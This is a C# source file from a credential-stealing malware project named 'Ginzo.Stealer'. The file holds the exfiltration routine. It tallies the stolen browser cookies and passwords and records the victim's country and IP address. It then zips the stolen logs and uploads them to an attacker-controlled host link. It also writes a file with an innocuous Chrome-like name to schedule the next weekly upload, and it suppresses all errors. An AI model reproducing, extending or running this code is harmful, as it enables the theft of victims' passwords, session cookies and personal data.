using System;
using System.IO;
using Ionic.Zip;
using Ionic.Zlib;
using System.Text;
using System.Net;

namespace Ginzo.Stealer.Methods
{
    internal class Request
    {
        public static void Sending()
        {
            string cookiescount = Browsers.Cookies.GetCookiesCount().ToString();
            string passwordscount = Browsers.Passwords.GetPasswordsCount().ToString();
            string country = Information.Country();
            string ipaddress = Information.GetIP();

            try
            {
                string zipArchive = Preparing.LogPath + "\\ginzoarchive.zip";
                using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
                {
                    zip.ParallelDeflateThreshold = -1;
                    zip.UseZip64WhenSaving = Zip64Option.Always;
                    zip.CompressionLevel = CompressionLevel.Default;
                    zip.AddDirectory(Preparing.LogPath);
                    zip.Save(zipArchive);
                }
                string urltosend = Program.HostLink;
                WebClient client = new WebClient();
                Uri link = new Uri(urltosend);
                client.UploadFile(link, zipArchive);
                DateTime nextweek = DateTime.Now.AddDays(7);
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + "ChromeUploadTime.txt"))
                {
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + "ChromeUploadTime.txt");
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\ChromeUploadTime.txt", nextweek.ToString());
                }
                else
                {
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\ChromeUploadTime.txt", nextweek.ToString());
                }
            }
            catch
            {
                return;
            }
        }
    }
}
